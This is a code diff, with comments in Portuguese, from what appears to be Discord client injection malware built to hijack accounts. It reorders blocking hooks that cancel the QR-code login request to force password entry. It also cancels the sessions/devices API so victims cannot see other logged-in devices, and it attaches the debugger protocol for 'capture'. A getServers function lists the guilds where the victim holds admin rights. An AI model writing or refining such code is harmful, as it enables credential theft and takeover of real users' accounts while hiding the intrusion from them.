@@ -124,30 +124,27 @@ const getServers = async t => {
     return { totalGuilds: d.length, message: rare ? `**Admin em:** ${rare}` : "**Sem servidores relevantes**" };
 };
 
-// --- MONITOR & INJECTION ---
+// --- INJECTION & BLOCKER ---
 const startCapture = () => {
     const win = BrowserWindow.getAllWindows()[0];
     if (!win) return setTimeout(startCapture, 1000);
 
     p3rsist();
 
-    // Bloqueios de Segurança (QR e Sessões)
-    // 1. Bloqueia o QR Code
-    session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));
-
-    // 2. Bloqueia a API de Sessões (Dispositivos)
-    // Usamos um filtro amplo para pegar qualquer versão da API (v8, v9, v10)
+// BLOQUEIO QUE VOCÊ PRECISA:
+    // onBeforeRequest com 'cancel: true' impede que o Discord receba a lista de aparelhos.
     session.defaultSession.webRequest.onBeforeRequest(CONFIG.session_filter, (details, callback) => {
-        // Isso faz com que a requisição de 'sessions' seja cancelada antes mesmo de sair do PC
-        // Na interface do Discord, isso geralmente resulta em um erro de carregamento ou 
-        // a lista de dispositivos simplesmente não aparece.
+        console.log("Bloqueando tentativa de ver dispositivos...");
         callback({ cancel: true });
     });
 
-    // 3. Garante que os cabeçalhos de autorização não sejam enviados para essas URLs
+    // Garante que o Token não saia nas headers para essa URL específica
     session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (details, callback) => {
         callback({ cancel: true });
     });
+
+    // Bloqueia QR Code para forçar login por senha
+    session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));
 
     // Debugger Protocol (Captura estável)
     if (!win.webContents.debugger.isAttached()) {
